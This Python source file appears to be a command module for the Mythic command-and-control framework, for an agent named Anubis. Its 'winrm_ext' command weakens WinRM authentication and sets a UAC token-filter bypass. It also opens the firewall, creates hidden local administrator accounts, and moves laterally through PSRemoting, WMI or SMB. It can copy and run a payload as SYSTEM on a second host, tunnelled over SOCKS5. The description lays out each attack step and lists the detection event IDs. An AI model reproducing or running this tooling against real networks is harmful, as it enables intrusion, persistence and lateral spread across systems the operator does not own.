from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class WinrmExtArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="remote",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "IP do HOST-B a configurar via lateral movement a partir do agente. "
                    "Vazio = self-host."
                ),
                default_value="",
            ),
            CommandParameter(
                name="target",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="IP/hostname (self-host). Vazio = IP local do agente.",
                default_value="",
            ),
            CommandParameter(
                name="port",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Porta WinRM (5986 se ssl=True). Padrão: 5985.",
                default_value=5985,
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Credencial (admin no alvo, p/ remote).",
                default_value="",
            ),
            CommandParameter(
                name="password",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Senha.",
                default_value="",
            ),
            CommandParameter(
                name="domain",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Domínio Windows (ex: CORP). Vazio = conta local.",
                default_value="",
            ),
            CommandParameter(
                name="socks_port",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Porta SOCKS5 a abrir no servidor Mythic. Padrão: 7005.",
                default_value=7005,
            ),
            CommandParameter(
                name="add_user",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Cria usuário local admin no alvo (self-host ou remote).",
                default_value="",
            ),
            CommandParameter(
                name="add_pass",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Senha do add_user. Vazio = senha aleatória gerada.",
                default_value="",
            ),
            CommandParameter(
                name="ssl",
                type=ParameterType.Boolean,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="HTTPS (5986) — suportado no bootstrap via PSRemoting.",
                default_value=False,
            ),
            CommandParameter(
                name="action",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="'cleanup' reverte configurações no alvo (local ou remoto).",
                default_value="",
            ),
            CommandParameter(
                name="deploy",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "(com remote) caminho do payload do Anubis no HOST-A; "
                    "copia e executa no HOST-B."
                ),
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line:
            if self.command_line.strip().startswith('{'):
                d = json.loads(self.command_line)
                self.add_arg("remote",     d.get("remote",     ""))
                self.add_arg("target",     d.get("target",     ""))
                self.add_arg("port",       d.get("port",       5985), ParameterType.Number)
                self.add_arg("username",   d.get("username",   ""))
                self.add_arg("password",   d.get("password",   ""))
                self.add_arg("domain",     d.get("domain",     ""))
                self.add_arg("socks_port", d.get("socks_port", 7005), ParameterType.Number)
                self.add_arg("add_user",   d.get("add_user",   ""))
                self.add_arg("add_pass",   d.get("add_pass",   ""))
                self.add_arg("ssl",        d.get("ssl",        False), ParameterType.Boolean)
                self.add_arg("action",     d.get("action",     ""))
                self.add_arg("deploy",     d.get("deploy",     ""))
            else:
                # Posicional: [target] [user] [password] [domain]
                parts = self.command_line.strip().split()
                self.add_arg("remote",     "")
                self.add_arg("target",     parts[0] if len(parts) > 0 else "")
                self.add_arg("username",   parts[1] if len(parts) > 1 else "")
                self.add_arg("password",   parts[2] if len(parts) > 2 else "")
                self.add_arg("domain",     parts[3] if len(parts) > 3 else "")
                self.add_arg("port",       5985, ParameterType.Number)
                self.add_arg("socks_port", 7005, ParameterType.Number)
                self.add_arg("add_user",   "")
                self.add_arg("add_pass",   "")
                self.add_arg("ssl",        False, ParameterType.Boolean)
                self.add_arg("action",     "")
                self.add_arg("deploy",     "")
        else:
            self.add_arg("remote",     "")
            self.add_arg("target",     "")
            self.add_arg("port",       5985, ParameterType.Number)
            self.add_arg("username",   "")
            self.add_arg("password",   "")
            self.add_arg("domain",     "")
            self.add_arg("socks_port", 7005, ParameterType.Number)
            self.add_arg("add_user",   "")
            self.add_arg("add_pass",   "")
            self.add_arg("ssl",        False, ParameterType.Boolean)
            self.add_arg("action",     "")
            self.add_arg("deploy",     "")


class WinrmExtCommand(CommandBase):
    cmd         = "winrm_ext"
    needs_admin = False
    help_cmd    = "winrm_ext [target_ip] [username] [password] [domain]"
    description = (
        "Configura e ativa WinRM no host do agente (self-host) ou em outro host "
        "via lateral movement a partir do agente (remote), com acesso via tunnel "
        "SOCKS5 (T1021.006/T1090).\n\n"
        "Self-host (no host do agente):\n"
        "  1. Auth: WSMAN\\Service\\AllowUnencrypted=1, Auth\\Basic=1\n"
        "  2. UAC: LocalAccountTokenFilterPolicy=1 (admins locais OK remoto)\n"
        "  3. Listener: WSMAN\\Listener\\{GUID} HTTP *:<port> (ou HTTPS 5986 c/ ssl)\n"
        "  4. Serviço WinRM: AutoStart via SCM ctypes\n"
        "  5. Firewall: netsh advfirewall add rule TCP/<port> inbound\n"
        "  6. TCP probe → retorna evil-winrm/netexec prontos via SOCKS5\n\n"
        "Remote (A→B, a partir do agente):\n"
        "  winrm_ext {\\\"remote\\\":\\\"10.0.0.5\\\",\\\"username\\\":\\\"adm\\\","
        "\\\"password\\\":\\\"P@ss\\\",\\\"domain\\\":\\\"CORP\\\"}\n"
        "  Cadeia de bootstrap: PSRemoting → WMI (CIM) → SMB (reg+SCM+schtasks).\n"
        "  Com \\\"deploy\\\": caminho do payload do Anubis no HOST-A → copia para "
        "\\\\B\\C$\\Windows\\Temp e executa como SYSTEM (novo callback).\n\n"
        "Extras:\n"
        "  add_user/add_pass : cria usuário local em Administrators no alvo\n"
        "  action='cleanup'  : reverte firewall, listener, registro e usuário\n\n"
        "Pré-requisito no operador (Kali):\n"
        "  apt install evil-winrm   # shell interativo WinRM\n"
        "  pipx install netexec      # nxc winrm (SOCKS5 nativo)\n\n"
        "Detecção no alvo:\n"
        "  EID 4624 (Logon Type 3), 4625, 4720/4732 (add_user), 7036 (WinRM restart),\n"
        "  WinRM Operational 91/142, 4946 (firewall rule added), 4104 (PS script block)"
    )
    version               = 1
    author                = "@wtechsec"
    attackmapping         = ["T1021.006", "T1090", "T1562.004", "T1136.001", "T1570"]
    supported_ui_features = []
    argument_class        = WinrmExtArguments
    attributes            = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        remote     = taskData.args.get_arg("remote")     or ""
        target     = taskData.args.get_arg("target")     or ""
        port       = taskData.args.get_arg("port")       or 5985
        socks_port = taskData.args.get_arg("socks_port") or 7005
        deploy     = taskData.args.get_arg("deploy")     or ""

        # ── Inicia SOCKS5 no servidor Mythic ──────────────────────────────────
        # "address already in use" = SOCKS5 já está ativo → apenas informa, não bloqueia
        socks_resp = await SendMythicRPCProxyStartCommand(MythicRPCProxyStartMessage(
            TaskID=taskData.Task.ID,
            PortType="socks",
            LocalPort=socks_port,
        ))
        if not socks_resp.Success:
            already = "already in use" in (socks_resp.Error or "").lower()
            msg = "[*] SOCKS5 já ativo na porta {} — reutilizando tunnel existente.\n".format(
                socks_port) if already else \
                "[!] SOCKS5 aviso: {}\n".format(socks_resp.Error)
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=msg.encode()
            ))

        # ── display_params ─────────────────────────────────────────────────────
        user_str = ""
        domain = taskData.args.get_arg("domain") or ""
        username = taskData.args.get_arg("username") or ""
        if domain and username:
            user_str = " {}\\{}".format(domain, username)
        elif username:
            user_str = " {}".format(username)

        if remote:
            response.DisplayParams = "REMOTO {}{} deploy={}".format(
                remote, user_str, deploy or "-")
        else:
            response.DisplayParams = "self-host {}:{}{}".format(
                target or "<IP do agente>", port, user_str)
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
